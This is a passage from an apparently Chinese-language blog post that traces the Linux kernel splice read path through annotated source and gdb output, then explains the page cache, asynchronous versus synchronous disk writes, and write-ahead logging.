<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下翻译自源码注释</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * generic_file_buffered_read - 通用文件读取例程</span></span><br><span class="line"><span class="comment">  * @iocb: 要读取的 iocb</span></span><br><span class="line"><span class="comment">  * @iter: 数据目的地</span></span><br><span class="line"><span class="comment">  * @written: 已复制</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 这是一个通用的文件读取例程，并使用 mapping-&gt;a_ops-&gt;readpage() 函数来处理实际的低级内容。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 这真的很难看。 但是当涉及到错误处理等时，goto 实际上试图澄清一些逻辑。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 返回：</span></span><br><span class="line"><span class="comment">  * * 复制的总字节数，包括那些已经被@写入负错误代码的字节，如果没有复制的话</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">generic_file_buffered_read</span><span class="params">(struct kiocb *iocb,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct iov_iter *iter, <span class="keyword">ssize_t</span> written)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;					<span class="comment">// 指向file的指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span> *<span class="title">ra</span> =</span> &amp;filp-&gt;f_ra;			<span class="comment">// 用于跟踪单个文件的预读状态</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> filp-&gt;f_mapping;		<span class="comment">// struct address_space ： Contents of a cacheable, mappable object.</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> mapping-&gt;host;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">pages_onstack</span>[<span class="title">PAGEVEC_SIZE</span>], **<span class="title">pages</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_pages = <span class="built_in">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="number">512</span>,</span><br><span class="line">			((iocb-&gt;ki_pos + iter-&gt;count + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT) -</span><br><span class="line">			(iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT));		<span class="comment">// nr_pages == 0x1</span></span><br><span class="line">	<span class="keyword">int</span> i, pg_nr, error = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">bool</span> writably_mapped;</span><br><span class="line">	<span class="keyword">loff_t</span> isize, end_offset;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(iocb-&gt;ki_pos &gt;= inode-&gt;i_sb-&gt;s_maxbytes))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!<span class="built_in">iov_iter_count</span>(iter)))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">iov_iter_truncate</span>(iter, inode-&gt;i_sb-&gt;s_maxbytes);	</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    iov_iter_truncate 函数定义如下</span></span><br><span class="line"><span class="comment">    static inline void iov_iter_truncate(struct iov_iter *i, u64 count)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if (i-&gt;count &gt; count)</span></span><br><span class="line"><span class="comment">		i-&gt;count = count;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">	这里 iter-&gt;count = 0x1， inode-&gt;i_sb-&gt;s_maxbytes == 0xffffffff000， inode-&gt;i_sb-&gt;s_maxbytes相当于iter-&gt;count的上限。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nr_pages &gt; <span class="built_in">ARRAY_SIZE</span>(pages_onstack))</span><br><span class="line">		pages = <span class="built_in">kmalloc_array</span>(nr_pages, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">void</span> *), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pages) &#123;</span><br><span class="line">		pages = pages_onstack;					<span class="comment">// *pages == 0x1</span></span><br><span class="line">		nr_pages = <span class="built_in">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, nr_pages, <span class="built_in">ARRAY_SIZE</span>(pages_onstack));				<span class="comment">// nr_pages == 0x1</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="built_in">cond_resched</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        翻译自源码注释：</span></span><br><span class="line"><span class="comment">如果我们已经成功复制了一些数据，那么我们不能再安全地返回 -EIOCBQUEUED。 因此，此时标记一个异步读取 NOWAIT 。</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">        <span class="comment">// 实际上此时written值为0x0，我们还写入任何数据</span></span><br><span class="line">		<span class="keyword">if</span> ((iocb-&gt;ki_flags &amp; IOCB_WAITQ) &amp;&amp; written)</span><br><span class="line">			iocb-&gt;ki_flags |= IOCB_NOWAIT;</span><br><span class="line"></span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		pg_nr = <span class="built_in">generic_file_buffered_read_get_pages</span>(iocb, iter,</span><br><span class="line">							     pages, nr_pages);		<span class="comment">// pg_nr == 0x1</span></span><br><span class="line">		<span class="keyword">if</span> (pg_nr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			error = pg_nr;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        翻译自源码：</span></span><br><span class="line"><span class="comment">* 在我们知道页面是最新的之后，必须检查 i_size。</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 检查后检查 i_size 允许我们计算“nr”的正确值，这意味着页面的零填充部分不会复制回用户空间（除非另一个截断扩展文件 - 这是需要的）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		isize = <span class="built_in">i_size_read</span>(inode);			<span class="comment">// isize == 0x552</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">unlikely</span>(iocb-&gt;ki_pos &gt;= isize))		<span class="comment">// iocb-&gt;ki_pos == 0x3，这个 iocb-&gt;ki_pos是传入的文件的偏移offset。</span></span><br><span class="line">			<span class="keyword">goto</span> put_pages;</span><br><span class="line"></span><br><span class="line">		end_offset = <span class="built_in">min_t</span>(<span class="keyword">loff_t</span>, isize, iocb-&gt;ki_pos + iter-&gt;count);		<span class="comment">// end_offset == 0x4	splice的是从0x3 ~ 0x4的一个字节</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> ((iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT) + pg_nr &gt;</span><br><span class="line">		       (end_offset + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT)</span><br><span class="line">			<span class="built_in">put_page</span>(pages[--pg_nr]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        翻译自源码注释：</span></span><br><span class="line"><span class="comment">* 一旦我们开始复制数据，我们不想接触任何可能被争用的缓存行：</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		writably_mapped = <span class="built_in">mapping_writably_mapped</span>(mapping);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * When a sequential read accesses a page several times, only</span></span><br><span class="line"><span class="comment">		 * mark it as accessed the first time.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT !=</span><br><span class="line">		    ra-&gt;prev_pos &gt;&gt; PAGE_SHIFT)		<span class="comment">// iocb-&gt;ki_pos = 0x3 , ra-&gt;prev_pos ==  0xffffffffffffffff</span></span><br><span class="line">			<span class="built_in">mark_page_accessed</span>(pages[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; pg_nr; i++)</span><br><span class="line">			<span class="built_in">mark_page_accessed</span>(pages[i]);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pg_nr; i++) &#123;</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> offset = iocb-&gt;ki_pos &amp; ~PAGE_MASK;		<span class="comment">// offset == 0x3</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> bytes = <span class="built_in">min_t</span>(<span class="keyword">loff_t</span>, end_offset - iocb-&gt;ki_pos,</span><br><span class="line">						   PAGE_SIZE - offset);		<span class="comment">// bytes == 0x1</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            翻译自源码注释：</span></span><br><span class="line"><span class="comment">            * 如果用户可以使用任意虚拟地址写入此页面，请在内核端读取页面之前注意潜在的别名。</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">			<span class="keyword">if</span> (writably_mapped)</span><br><span class="line">				<span class="built_in">flush_dcache_page</span>(pages[i]);</span><br><span class="line"></span><br><span class="line">			copied = <span class="built_in">copy_page_to_iter</span>(pages[i], offset, bytes, iter);	<span class="comment">// 此时 i== 0，offset == 0x3，bytes == 0x1 跟进</span></span><br><span class="line"></span><br><span class="line">			written += copied;</span><br><span class="line">			iocb-&gt;ki_pos += copied;</span><br><span class="line">			ra-&gt;prev_pos = iocb-&gt;ki_pos;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (copied &lt; bytes) &#123;</span><br><span class="line">				error = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">put_pages:</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pg_nr; i++)</span><br><span class="line">			<span class="built_in">put_page</span>(pages[i]);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">iov_iter_count</span>(iter) &amp;&amp; iocb-&gt;ki_pos &lt; isize &amp;&amp; !error);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">file_accessed</span>(filp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pages != pages_onstack)</span><br><span class="line">		<span class="built_in">kfree</span>(pages);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> written ? written : error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p *iocb</span><br><span class="line">$179 = &#123;</span><br><span class="line">  ki_filp = 0xffff8880042a6700,</span><br><span class="line">  ki_pos = 0x3,</span><br><span class="line">  ki_complete = 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">  private = 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">  ki_flags = 0x0,</span><br><span class="line">  ki_hint = 0x0,</span><br><span class="line">  ki_ioprio = 0x0,</span><br><span class="line">  &#123;</span><br><span class="line">    ki_cookie = 0x0,</span><br><span class="line">    ki_waitq = 0x0 &lt;fixed_percpu_data&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">gef➤  p iocb</span><br><span class="line">$180 = (struct kiocb *) 0xffffc900003b7df0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="11、copy-page-to-iter"><a href="#11、copy-page-to-iter" class="headerlink" title="11、copy_page_to_iter"></a>11、copy_page_to_iter</h4><p>没做啥，继续跟进<code>copy_page_to_iter_pipe</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">copy_page_to_iter</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!<span class="built_in">page_copy_sane</span>(page, offset, bytes)))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (i-&gt;type &amp; (ITER_BVEC|ITER_KVEC)) &#123;</span><br><span class="line">		<span class="keyword">void</span> *kaddr = <span class="built_in">kmap_atomic</span>(page);</span><br><span class="line">		<span class="keyword">size_t</span> wanted = <span class="built_in">copy_to_iter</span>(kaddr + offset, bytes, i);</span><br><span class="line">		<span class="built_in">kunmap_atomic</span>(kaddr);</span><br><span class="line">		<span class="keyword">return</span> wanted;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">iov_iter_is_discard</span>(i)))</span><br><span class="line">		<span class="keyword">return</span> bytes;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">likely</span>(!<span class="built_in">iov_iter_is_pipe</span>(i)))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">copy_page_to_iter_iovec</span>(page, offset, bytes, i);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">copy_page_to_iter_pipe</span>(page, offset, bytes, i);		<span class="comment">// 跟进</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="12、copy-page-to-iter-pipe"><a href="#12、copy-page-to-iter-pipe" class="headerlink" title="12、copy_page_to_iter_pipe"></a>12、copy_page_to_iter_pipe</h4><p>从这里可以看出，上面将文件信息放入<code>page</code>，这里将<code>page</code>赋值给pipe_buffer-&gt;page，并不涉及到数据的复制，完全靠的是指针的传递。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;			<span class="comment">// p_tail  = 0x10</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;		<span class="comment">// p_mask === 0xf</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;			<span class="comment">// i_head == 0x10</span></span><br><span class="line">	<span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(bytes &gt; i-&gt;count))		<span class="comment">// bytes == 0x1  i-&gt;count == 0x1</span></span><br><span class="line">		bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!bytes))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">sanity</span>(i))						<span class="comment">// 对inode 做一些合规检查，比如pipe不能为空，必须在 last buffer中等等。</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	off = i-&gt;iov_offset;				<span class="comment">// off == 0x0 ，这里的off是管道偏移，我们传入的参数就是0</span></span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line">			<span class="comment">/* merge with the last one */</span></span><br><span class="line">			buf-&gt;len += bytes;</span><br><span class="line">			i-&gt;iov_offset += bytes;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		i_head++;</span><br><span class="line">		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">pipe_full</span>(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">	<span class="built_in">get_page</span>(page);</span><br><span class="line">	buf-&gt;page = page;						<span class="comment">// 可见splice并没有数据的复制，有的只有指针的传递，将文件page的指针赋值给管道的buf-&gt;page。</span></span><br><span class="line">	buf-&gt;offset = offset;</span><br><span class="line">	buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">	i-&gt;iov_offset = offset + bytes;</span><br><span class="line">	i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">	i-&gt;count -= bytes;</span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="七、page-cache"><a href="#七、page-cache" class="headerlink" title="七、page cache"></a>七、page cache</h3><p>考虑到这样一个场景，在现有的linux环境下，当我们使用write/read进行读写文件时，我们操作的是磁盘文件吗？</p>
<p>带着这个疑问，我们思考一下，当涉及到文件操作时，操作系统必须解决两个严重的问题：</p>
<ol>
<li>当操作系统读做数据的访问操作时，对磁盘的访问速度远小于内存，文件越大，效果越明显。</li>
<li>当多个进程均访问同一个磁盘文件的内容时，由于进程数据隔离，不可能将文件内容在所有进程都拷贝一份。如果您使用 <a class="link"   target="_blank" rel="noopener" href="http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx" >Process Explorer<i class="fas fa-external-link-alt"></i></a>查看 Windows 进程，您会看到每个进程中加载了大约 15MB 的常用 DLL。我的 Windows 机器现在正在运行 100 个进程，因此如果不共享，我将使用高达 ~1.5 GB 的物理 RAM<em>来处理常见的 DLL</em>。</li>
</ol>
<p>基于上面的观点，对内存的访问相较于对磁盘的访问来说更高效。</p>
<p>但是内存是有限的，我们不可能将磁盘上所有的内容都放入内存中，这时就需要对放入内存中的磁盘文件进行筛选。这时Page cache应运而生。</p>
<p>在计算机，page cache，有时也称为disk cache，它是一种透明缓存，用于存储源自二级存储设备（如硬盘驱动器(HDD) 或固态驱动器(SSD)）的页面。操作系统在主内存(RAM)的其他未使用部分中保留页面缓存，从而更快地访问缓存页面的内容并提高整体性能。页面缓存在内核中通过分页内存管理实现，并且对应用程序几乎是透明的。</p>
<p>由于硬盘和内存的读写性能差距巨大，Linux默认情况是以异步方式读写文件的。比如调用系统函数open()打开或者创建文件时缺省情况下是带有O_ASYNC flag的。Linux借助于内核的page cache来实现这种异步操作。引用《Understanding the Linux Kernel, 3rd Edition》中关于<code>page cache</code>的定义：</p>
<blockquote>
<p>The page cache is the main disk cache used by the Linux kernel. In most cases, the kernel refers to the page cache when reading from or writing to disk. New pages are added to the page cache to satisfy User Mode processes’s read requests. If the page is not already in the cache, a new entry is added to the cache and filled with the data read from the disk. If there is enough free memory, the page is kept in the cache for an indefinite period of time and can then be reused by other processes without accessing the disk.<br>Similarly, before writing a page of data to a block device, the kernel verifies whether the corresponding page is already included in the cache; if not, a new entry is added to the cache and filled with the data to be written on disk. The I/O data transfer does not start immediately: the disk update is delayed for a few seconds, thus giving a chance to the processes to further modify the data to be written (in other words, the kernel implements deferred write operations).</p>
</blockquote>
<p>也就是说，我们平常向硬盘写文件时，默认异步情况下，并不是直接把文件内容写入到硬盘中才返回的，而是成功拷贝到内核的page cache后就直接返回，所以大多数情况下，硬盘写操作不会是性能瓶颈。写入到内核page cache的pages成为dirty pages，稍后会由内核线程pdflush真正写入到硬盘上。</p>
<p>从硬盘读取文件时，同样不是直接把硬盘上文件内容读取到用户态内存，而是先拷贝到内核的page cache，然后再“拷贝”到用户态内存，这样用户就可以访问该文件。因为涉及到硬盘操作，所以第一次读取一个文件时，不会有性能提升；不过，如果一个文件已经存在page cache中，再次读取该文件时就可以直接从page cache中命中读取不涉及硬盘操作，这时性能就会有很大提高。</p>
<p>下面用<code>dd</code>比较下异步（缺省模式）和同步写硬盘的速度差别：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dd if=/dev/urandom of=async.txt bs=64M count=16 iflag=fullblock</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 7.618 s, 141 MB/s</span><br><span class="line">$ dd if=/dev/urandom of=sync.txt bs=64M count=16 iflag=fullblock oflag=sync</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 13.2175 s, 81.2 MB/s</span><br></pre></td></tr></table></figure>

<p>page cache除了可以提升和硬盘交互性能外，下面继续讨论page cache功能。</p>
<h4 id="1、如果程序crash，异步模式会丢失数据吗？"><a href="#1、如果程序crash，异步模式会丢失数据吗？" class="headerlink" title="1、如果程序crash，异步模式会丢失数据吗？"></a>1、如果程序crash，异步模式会丢失数据吗？</h4><p>比如存在这样的场景：一批数据已经成功写入到page cache，这时程序突然crash，但是在page cache里的数据还没来得及被pdflush写回到硬盘，这批数据会丢失吗？<br>答案是，要看具体情况：</p>
<ol>
<li>如果OS没有crash或者重启的话，仅仅是写数据的程序crash，那么已经成功写入到page cache中的dirty pages是会被pdflush在合适的时机被写回到硬盘，不会丢失数据；</li>
<li>如果OS也crash或者重启的话，因为page cache存放在内存中，一旦断电就丢失了，那么就会丢失数据。<br>至于这种情况下，会丢失多少数据，主要看系统重启前有多少dirty pages被写入到硬盘，已经成功写回硬盘的就不会丢失；没来得急写回硬盘的数据就彻底丢失了。这也是异步写硬盘的一个潜在风险。<br>同步写硬盘时就不存在这种丢数据的风险。同步写操作返回成功时，能保证数据一定被保存在硬盘上了。</li>
</ol>
<p>引用RocksDB wiki中关于“<a class="link"   target="_blank" rel="noopener" href="https://github.com/facebook/rocksdb/wiki/Basic-Operations#asynchronous-writes" >Asynchronous Writes<i class="fas fa-external-link-alt"></i></a>”描述：</p>
<blockquote>
<p>Asynchronous writes are often more than a thousand times as fast as synchronous writes. The downside of asynchronous writes is that a crash of the machine may cause the last few updates to be lost. Note that a crash of just the writing process (i.e., not a reboot) will not cause any loss since even when sync is false, an update is pushed from the process memory into the operating system before it is considered done.</p>
</blockquote>
<p>那么如何避免因为系统重启或者机器突然断电，导致数据丢失问题呢？<br>可以借助于WAL（Write-Ahead Log）技术。</p>
<p>WAL技术在数据库系统中比较常见，在数据库中一般又称之为redo log，Linux 文件系统ext3/ext4称之为journaling。WAL作用是：写数据库或者文件系统前，先把相关的metadata和文件内容写入到WAL日志中，然后才真正写数据库或者文件系统。WAL日志是append模式，所以，对WAL日志的操作要比对数据库或者文件系统的操作轻量级得多。如果对WAL日志采用同步写模式，那么WAL日志写成功，即使写数据库或者文件系统失败，可以用WAL日志来恢复数据库或者文件系统里的文件。</p>
<h4 id="2、查看一个文件占用page-cache情况"><a href="#2、查看一个文件占用page-cache情况" class="headerlink" title="2、查看一个文件占用page cache情况"></a>2、查看一个文件占用page cache情况</h4><p>可以借助于<a class="link"   target="_blank" rel="noopener" href="https://hoytech.com/vmtouch/" >vmtouch<i class="fas fa-external-link-alt"></i></a>工具：</p>
<blockquote>
